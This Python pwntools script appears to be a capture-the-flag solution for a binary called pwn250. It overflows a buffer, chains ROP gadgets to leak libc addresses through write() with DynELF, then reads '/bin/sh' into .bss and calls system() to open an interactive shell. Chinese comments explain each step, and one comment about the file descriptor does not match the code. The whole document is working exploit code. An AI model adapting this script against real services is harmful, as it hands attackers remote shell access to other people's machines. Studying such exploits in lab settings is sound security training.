#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote('172.17.0.3', 10001)
elf = ELF('./pwn250')

pop_rdi = 0x400633
pop_rdi_rsi_rdx = 0x40056a
start_addr = 0x400470
write_addr = elf.plt['write']
binsh_addr = 0x601040

def leak(addr):
	payload = 'A'*136	#padding
	payload += p64(pop_rdi_rsi_rdx)	#给write函数赋值
	payload += p64(1)	#fd = 1，即stdout
	payload += p64(addr)	#buf = addr，泄露指定地址的内容
	payload += p64(4)	#每次泄露4字节
	payload += p64(write_addr)	#调用write()
	payload += p64(start_addr)	#write()返回到start，重置栈
	io.sendline(payload)
	content = io.recv()[:4]
	log.info("%#x -> %s" %(addr, (content or '').encode('hex')))
	return content

d = DynELF(leak, elf = elf)
system_addr = d.lookup('system', 'libc')
read_addr = d.lookup('read', 'libc')

log.info("system_addr = %#x", system_addr)
log.info("read_addr = %#x", read_addr)

payload = 'A'*136	#padding
payload += p64(pop_rdi_rsi_rdx)	#给read函数赋值
payload += p64(1)	#fd = 0，即stdin
payload += p64(binsh_addr)	#把"/bin/sh"读取到地址固定的.bss段中
payload += p64(8)	#读取8个字节
payload += p64(read_addr)	#调用read()读取"/bin/sh\x00"
payload += p64(pop_rdi)	#返回到pop rdi; ret，给system函数赋值
payload += p64(binsh_addr)	#rdi = &(binsh_addr)
payload += p64(system_addr)	#调用system执行system("/bin/sh")
io.sendline(payload)
sleep(0.1)
io.sendline('/bin/sh\x00')
io.interactive()